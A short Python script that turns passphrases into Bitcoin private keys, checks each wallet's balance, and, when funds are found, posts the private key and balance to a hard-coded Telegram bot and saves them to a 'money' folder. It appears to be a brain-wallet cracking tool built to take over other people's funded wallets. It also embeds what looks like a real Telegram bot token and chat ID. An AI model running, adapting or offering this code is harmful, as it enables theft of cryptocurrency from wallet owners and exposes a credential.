from bit import Key
import hashlib
import requests
import binascii
import ecdsa
import base58
from sys import argv


script, key_argv = argv


def seed(f):
    return hashlib.sha256(f.encode("utf-8")).hexdigest()


def pub_key(secret_exponent):
    key = binascii.unhexlify(secret_exponent)
    s = ecdsa.SigningKey.from_string(key, curve = ecdsa.SECP256k1)
    return '04' + binascii.hexlify(s.verifying_key.to_string()).decode('utf-8')


def addr(public_key):
    output = []; alphabet = '123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz'
    var = hashlib.new('ripemd160')
    var.update(hashlib.sha256(binascii.unhexlify(public_key.encode())).digest())
    var = '00' + var.hexdigest() + hashlib.sha256(hashlib.sha256(binascii.unhexlify(('00' + var.hexdigest()).encode())).digest()).hexdigest()[0:8]
    count = [char != '0' for char in var].index(True) // 2
    n = int(var, 16)
    while n > 0:
        n, remainder = divmod(n, 58)
        output.append(alphabet[remainder])
    for i in range(count): output.append(alphabet[0])
    return ''.join(output[::-1])


def wif(secret_exponent):
    var80 = "80"+secret_exponent
    var = hashlib.sha256(binascii.unhexlify(hashlib.sha256(binascii.unhexlify(var80)).hexdigest())).hexdigest()
    return str(base58.b58encode(binascii.unhexlify(str(var80) + str(var[0:8]))), 'utf-8')


try:
    f = key_argv
    secret_exponent = seed(f)
    public_key = pub_key(secret_exponent)
    address = addr(public_key)
    WIF = wif(secret_exponent)
    key = Key(WIF)
    balance = key.get_balance()

    if int(balance) != 0:
        response = requests.post(
            url='https://api.telegram.org/bot1420550733:AAGv9VhgYDyA1cJr76Mt-ToEdnk6s59poFg/sendMessage',
            data={'chat_id': 1293582406, 'text': f'Key: {key.to_wif()}\nBalance: {balance}'}
        ).json()
        with open(f"money/{f}.txt", 'w') as file:
            file.write(f'Key: {key.to_wif()}\nBalance: {balance}')
        print(f"Address: {address}\nKey: {WIF}\nBalance: {balance}\n"
              f"Phrase: {f}\n----------------------------------------------------------------------\n\n")
    else:
        print(f"Address: {address}\nKey: {WIF}\nBalance: {balance}\n"
              f"Phrase: {f}\n----------------------------------------------------------------------\n\n")

except Exception as e:
    print(e)


